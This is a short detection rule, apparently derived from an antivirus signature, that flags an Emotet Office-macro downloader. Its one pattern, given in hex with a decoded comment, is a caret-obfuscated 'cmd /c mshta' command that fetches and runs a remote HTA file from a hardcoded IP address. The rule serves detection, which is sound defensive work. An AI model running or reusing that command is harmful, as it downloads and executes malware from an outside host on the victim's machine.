
rule TrojanDownloader_O97M_Emotet_RPA_MTB{
	meta:
		description = "TrojanDownloader:O97M/Emotet.RPA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,01 00 01 00 01 00 00 01 00 "
		
	strings :
		$a_01_0 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 39 32 2e 32 35 35 2e 35 37 2e 31 39 35 2f 72 75 2f 72 75 2e 68 74 6d 6c } //00 00  cmd /c m^sh^t^a h^tt^p^:/^/92.255.57.195/ru/ru.html
	condition:
		any of ($a_*)
 
}